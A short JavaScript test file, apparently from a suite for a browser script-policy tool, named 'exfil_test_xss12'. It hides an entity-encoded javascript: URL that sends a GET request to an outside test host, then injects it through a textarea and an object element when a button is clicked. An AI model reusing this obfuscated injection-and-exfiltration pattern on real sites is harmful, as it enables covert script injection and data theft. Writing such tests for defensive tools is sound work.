// exfil_test_xss12.js
function exfiltrate_key_history() {
  var enc = "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000070&#0000117&#0000110&#0000099&#0000116&#0000105&#0000111&#0000110&#0000040&#0000039&#0000120&#0000109&#0000108&#0000104&#0000116&#0000116&#0000112&#0000061&#0000110&#0000101&#0000119&#0000032&#0000088&#0000077&#0000076&#0000072&#0000116&#0000116&#0000112&#0000082&#0000101&#0000113&#0000117&#0000101&#0000115&#0000116&#0000040&#0000041&#0000059&#0000120&#0000109&#0000108&#0000104&#0000116&#0000116&#0000112&#0000046&#0000111&#0000112&#0000101&#0000110&#0000040&#0000034&#0000071&#0000069&#0000084&#0000034&#0000044&#0000034&#0000104&#0000116&#0000116&#0000112&#0000058&#0000047&#0000047&#0000065&#0000110&#0000097&#0000108&#0000121&#0000116&#0000105&#0000099&#0000115&#0000073&#0000110&#0000099&#0000058&#0000056&#0000048&#0000048&#0000048&#0000047&#0000115&#0000117&#0000098&#0000109&#0000105&#0000115&#0000115&#0000105&#0000111&#0000110&#0000046&#0000104&#0000116&#0000109&#0000108&#0000063&#0000116&#0000101&#0000115&#0000116&#0000061&#0000120&#0000115&#0000115&#0000049&#0000050&#0000034&#0000044&#0000116&#0000114&#0000117&#0000101&#0000041&#0000059&#0000120&#0000109&#0000108&#0000104&#0000116&#0000116&#0000112&#0000046&#0000115&#0000101&#0000110&#0000100&#0000040&#0000110&#0000117&#0000108&#0000108&#0000041&#0000059&#0000039&#0000041&#0000040&#0000041";
  var bounce = document.createElement("textarea");
  JAM.set(bounce, "innerHTML", enc);
  var script = document.createElement("object");
  script.data = bounce.value;
  var v0 = document.getElementsByTagName("body")[0];
  JAM.call(v0.appendChild, v0, [script]);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

